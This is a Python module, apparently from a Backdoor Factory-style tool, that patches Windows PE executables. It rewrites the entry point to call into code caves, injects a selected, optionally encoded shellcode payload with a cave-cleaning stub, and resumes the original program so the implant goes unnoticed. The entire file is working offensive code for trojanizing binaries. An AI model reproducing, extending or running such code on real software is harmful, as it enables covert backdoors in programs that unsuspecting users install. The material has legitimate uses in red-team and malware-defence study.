import os
import logging
from core import enum
from core import support
import io
import struct
from pe.core import intelCore
from pe.core import core
logger = logging.getLogger(__name__)



class call_at_entrypoint:

    def __init__(self):
        logger.debug("In file {0}".format(str(os.path.abspath(__file__))))
        self.name = """call_at_entrypoint"""
        self.description = """Hook entry point patching methods"""
        self.requirements = {'FILE':'Binary to be patched',
                             'MODE':'How the patching will happen',
                             'PAYLOAD': 'Payload to be patched into binary',
                             'ENCODER': 'Encoder to encode the payload, not all payloads support encoders'
                            }
        self.found_encoder = False

    # EMIT PATCHING INSTRUCTIONS
    def set_jmp_patch_instr(self):
        """
        This function takes the flItms dict and patches the
        executable entry point to jump to the first code cave.
        Since this is the jmp at entry point, we need this instruction set in 
        this patching method. TODO: Return a patchlet command vs patching
        """
        logger.info ("[*] Setting initial entry patch instructions")

        #This is the JMP command in the beginning of the
        #code entry point that jumps to the codecave
        self.BDF.patch_instr[self.BDF.pe_object['LocOfEntryinCode']] = b"\xe8"
        logger.debug(f"JMPtoCodeAddress in set_jmp_patch_instr: {hex(self.BDF.pe_object['JMPtoCodeAddress'])}")
        if self.BDF.pe_object['JMPtoCodeAddress'] < 0:
            logger.debug(f"< {hex(0xffffffff + self.BDF.pe_object['JMPtoCodeAddress'])}")
            self.BDF.patch_instr['JMPAddress'] = struct.pack('<I', 0xffffffff + self.BDF.pe_object['JMPtoCodeAddress'])
        else:
            logger.debug(f"> {hex(self.BDF.pe_object['JMPtoCodeAddress'])}")
            self.BDF.patch_instr['JMPAddress'] = struct.pack('<I', self.BDF.pe_object['JMPtoCodeAddress'])

        # To make any overwritten instructions disassembler friendly
        if self.BDF.pe_object['count_bytes'] > 5:
            for i in range(self.BDF.pe_object['count_bytes'] - 5):
                self.BDF.patch_instr['PADDING' + str(i)] = b'\x90'

    def support_checks(self):
        support_chk = support.support(self)
        #pre-process here
        if not support_chk.check_reqs():
            return False

        if not support_chk.check_modes():
            return False

        if not support_chk.check_payloads():
            return False

        if not support_chk.check_core():
            return False

        if not support_chk.check_modifier():
            return False

        if not support_chk.check_encoders():
            return False

        return True


    def patch(self, BDF):
        # self.BDF is passed to inherited classes add class objects if you want them passed to other classes
        self.BDF = BDF
        # since this is jmp at entry, we use jmp_core
        self.BDF.core_support = 'call_core'

        self.BDF.CavesToFix = {}

        if not self.support_checks():
            return False

        logger.info("[*] Selected Payload: {0}".format(self.found_payload.__class__.__name__))

        logger.info("[*] Selected Mode: {0}".format(self.found_mode.__class__.__name__))

        """
        The mode tells the how the payload will be employed, whether:
        - single cave
        - txt section extension
        - appending caves
        - automatic mode (enums mode and picks)
        - or whatever you develop
        """

        self.BDF.found_payload = self.found_payload

        # CALL IAT FUNCTIONS HERE
        if self.BDF.found_payload.apis_needed:
            iat = core.core(self.BDF)
            iat_result = iat.iat_workflow()
            if not iat_result:
                return False
        # Get the shellcode based on the mode
        self.BDF.pe_object['allshells'] = self.BDF.found_payload.invoke(self)

        if self.BDF.pe_object['allshells'] is False:
            return False

        self.BDF.pe_object['shellcode'] = b''.join(self.BDF.pe_object['allshells'])    

        logger.debug(f"self.BDF.pe_object['shellcode'] {self.BDF.pe_object['shellcode']}")
        logger.debug(f"DEBUG SELF: {dir(BDF)}")
        logger.debug(f"self.found_core:  {self.found_core} - {type(self.found_core)}")

        # Found Core is an artifact from the support call
        targetFile = self.found_core
        targetFile.BDF = self.BDF
        logger.debug(targetFile)
        targetFile.entry_instr()
        logger.debug(f"ImpList: {self.BDF.pe_object['ImpList']}")
        _, self.BDF.pe_object['resumeExe'] = targetFile.resume_execution_call()
        self.BDF.pe_object['resumeExe_len'] = len(self.BDF.pe_object['resumeExe'])

        # CALL ENCODER HERE
        # Encoder will determine where it can be patched and split.
        shellcode_length = len(self.BDF.pe_object['shellcode'])

        logger.debug(f'shellcode_length: {shellcode_length}')

        self.BDF.pe_object['shellcode_length'] = shellcode_length + len(self.BDF.pe_object['resumeExe'])

        logger.debug(f"self.BDF.pe_object['shellcode_length'] {self.BDF.pe_object['shellcode_length']}")
        logger.debug(f"found_mode: {self.found_mode}")

        # Execute stuffing mode
            # Appending
            # Single Cave - find a cave
            # Cave Jumping - find a series of cavesf
            # automated

        self.found_mode.BDF = self.BDF
        found_mode_result = self.found_mode.invoke_mode()

        if not found_mode_result:
            return False
        logger.debug(f"JMPtoCodeAddress before CavesPicked: {hex(self.BDF.pe_object['JMPtoCodeAddress'])}")

        # CavesPicked -- Assigning Caves
        # This can be moved to a different mode perhaps
        if 'CavesPicked' in self.BDF.pe_object and 'text_loader' not in self.found_mode.name:
            self.BDF.pe_object['JMPtoCodeAddress'] = next(iter(self.BDF.pe_object['CavesPicked'].items()))[1][6]
            logger.debug(self.BDF.pe_object['CavesPicked'])
            for cave, values in self.BDF.pe_object['CavesPicked'].items():
                logger.debug(f"[>] {cave, values[6] + 5 + self.BDF.pe_object['PatchLocation'], self.BDF.pe_object['len_allshells'][cave]}")
                self.BDF.CavesToFix[cave] = [values[6] + 5 + self.BDF.pe_object['PatchLocation'], self.BDF.pe_object['len_allshells'][cave]]
                self.BDF.pe_object['CleanCavesStub'] = targetFile.clean_caves_stub(self.BDF.CavesToFix)

            logger.debug(f"self.BDF.pe_object['JMPtoCodeAddress'] {hex(self.BDF.pe_object['JMPtoCodeAddress'])}")

            self.BDF.pe_object['LastCaveAddress'] = self.BDF.pe_object['CavesPicked'][len(self.BDF.pe_object['CavesPicked']) - 1][6]

        logger.debug(f"JMPtoCodeAddress after CavesPicked: {hex(self.BDF.pe_object['JMPtoCodeAddress'])}")

        # recalling resumeExe
        ReturnTrackingAddress, self.BDF.pe_object['resumeExe'] = targetFile.resume_execution_call()

        # recall the payload to set the initial location for the payload
        self.BDF.pe_object['allshells'] = self.BDF.found_payload.invoke(self)


        if self.BDF.pe_object['allshells'] is False:
            return False

        self.BDF.pe_object['shellcode'] = b''.join(self.BDF.pe_object['allshells'])    
        logger.debug(f"self.BDF.pe_object['shellcode'] {self.BDF.pe_object['shellcode']}")

        self.BDF.pe_object['completeShellcode'] = self.BDF.pe_object['shellcode'] + self.BDF.pe_object['resumeExe']

        self.set_jmp_patch_instr()

        self.found_mode.get_patch_instr()

        # set file to a writeable handle
        self.patched_binary = io.BytesIO(self.BDF.original_binary.read(-1))

        # modify it
        patch = support.support(self)
        patch.patch_file()

        ############
        #
        #
        # END
        #
        #
        ############

        # always return the StringIO object
        result = self.patched_binary

        result.seek(0)

        return result
